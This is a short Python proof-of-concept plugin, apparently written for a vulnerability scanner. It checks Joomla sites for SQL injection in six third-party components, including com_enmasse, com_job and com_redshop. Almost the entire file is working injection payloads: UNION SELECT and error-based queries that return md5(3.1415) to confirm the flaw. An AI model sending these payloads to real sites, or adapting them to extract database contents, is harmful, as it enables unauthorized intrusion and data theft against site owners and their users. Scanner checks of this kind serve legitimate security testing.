#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
POC Name  :  joomla sqlis
References: 
Author    :  13
QQ        :  779408317
"""

def assign(service, arg):
    if service == "joomla":
        return True, arg

def audit(arg):
    payloads = (
         "index.php/weblinks-categories?id=0%20%29%20union%20select%20md5(3.1415)--%20%29",
         "index.php?option=com_s5clanroster&view=s5clanroster&layout=category&task=category&id=-null%27+/*!50000UnIoN*/+/*!50000SeLeCt*/md5(3.1415),222-- -",
         "index.php?option=com_pccookbook&page=viewuserrecipes&user_id=-9999999+UNION+SELECT+md5(3.1415)--",
         "index.php?categoryId=1&controller=deal&keyword=1&locationId=1&option=com_enmasse&sortBy=117%20and%28select%201%20from%28select%20count%28*%29,concat%28%28select%20%28select%20%28select%20mid(md5(3.1415),1,16)%29%20%29%20from%20%60information_schema%60.tables%20limit%200%2C1%29%2Cfloor%28rand%280%29*2%29%29x%20from%20%60information_schema%60.tables%20group%20by%20x%29a%29%20and%201=1",
         "index.php?option=com_job&controller=listcategory&task=viewJob&id_job=-1+UNION+ALL+SELECT+1,md5(3.1415),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42--",
         "index.php?tmpl=component&option=com_redshop&view=product&task=addtocompare&pid=24%22%20and%201=0%20union%20select%201,2,3,4,5,6,7,8,md5(3.1415),10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63%23&cmd=add&cid=20&sid=0.6886686905513422"
         )
    for payload in payloads:
        url = arg + payload
        code, head, res, errcode, _ = curl.curl('"%s"' % url)
        if code == 200 and "63e1f04640e83605c1d177544a5a0488" in res:
            security_hole(url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('joomla', 'http://www.example.com/')[1])